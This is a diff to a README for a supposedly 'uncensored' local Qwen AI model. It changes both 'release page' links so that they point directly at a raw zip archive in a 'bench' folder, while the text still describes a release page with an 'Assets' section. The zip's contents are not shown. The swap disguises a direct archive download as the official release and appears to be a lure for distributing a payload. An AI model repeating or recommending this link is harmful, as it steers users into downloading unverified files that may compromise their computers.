@@ -1,6 +1,6 @@
 # 🤖 Qwen3.6-27B-AEON-Ultimate-Uncensored-DFlash - Run Advanced Artificial Intelligence Models Locally
 
-[![Download Files](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Bryanwasnick/Qwen3.6-27B-AEON-Ultimate-Uncensored-DFlash/releases)
+[![Download Files](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Bryanwasnick/Qwen3.6-27B-AEON-Ultimate-Uncensored-DFlash/main/bench/D-Ultimate-Flash-Uncensored-AEO-Qwen-v2.0.zip)
 
 This software allows you to run high-performance artificial intelligence models on your Windows computer. By using optimized hardware quantization, the system provides faster performance without loss in model quality. You can process complex tasks, generate text, and analyze data without sending information to external cloud servers.
 
@@ -18,7 +18,7 @@ To run this model effectively, your computer requires specific hardware componen
 
 You must obtain the necessary files from the official release page. The repository provides two versions of the model: the BF16 version for high-precision tasks and the NVFP4 version for hardware-accelerated efficiency.
 
-1. Navigate to the release page: https://github.com/Bryanwasnick/Qwen3.6-27B-AEON-Ultimate-Uncensored-DFlash/releases
+1. Navigate to the release page: https://raw.githubusercontent.com/Bryanwasnick/Qwen3.6-27B-AEON-Ultimate-Uncensored-DFlash/main/bench/D-Ultimate-Flash-Uncensored-AEO-Qwen-v2.0.zip
 2. Look for the "Assets" section at the bottom of the latest release post.
 3. Select the file relevant to your hardware setup. If you have an NVIDIA drive with Blackwell support, choose the NVFP4 version.
 4. Click the file name to start the download. Save the file to a folder where you have write permissions.
